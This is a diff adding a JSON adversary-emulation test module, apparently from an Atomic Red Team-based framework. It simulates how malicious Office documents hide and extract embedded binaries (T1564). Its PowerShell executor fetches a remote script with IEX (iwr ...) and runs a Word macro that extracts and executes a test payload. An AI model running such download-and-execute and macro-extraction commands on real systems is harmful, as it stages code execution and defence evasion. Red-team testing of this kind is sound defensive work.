@@ -1,0 +1,31 @@
+{
+    "name": "Extract binary files via VBA",
+    "description": "This module extracts a binary (calc.exe) from inside of another binary.   In the wild maldoc authors will use this technique to hide binaries inside of files stored  within the office document itself. An example of this technique can be seen in sample  f986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226  This sample contains a document inside of itself. Document 1 is the actual maldoc itself, document 2 is the same document without all the malicious code. Document 1 will copy Document 2 to the file system and then peek inside of this document and pull out the oleObject.bin file. Contained inside of this oleObject.bin file is a payload that is parsed out and executed on the file system. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "$macro = [System.IO.File]::ReadAllText(\"PathToAtomicsFolder\\T1564\\src\\T1564-macrocode.txt\")\n$macro = $macro -replace \"aREPLACEMEa\", \"PathToAtomicsFolder\\T1564\\bin\\extractme.bin\"\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroCode \"$macro\" -officeProduct \"Word\" -sub \"Extract\" -NoWrap\n",
+        "cleanup_command": "Remove-Item \"$env:TEMP\\extracted.exe\" -ErrorAction Ignore\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1564",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Hide Artifacts",
+    "source": "ART",
+    "uuid": "6afe288a-8a8b-4d33-a629-8d03ba9dad3a",
+    "arguments": null,
+    "preconditions": [
+        {
+            "description": "Microsoft Word must be installed\n",
+            "prereq_command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
+            "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
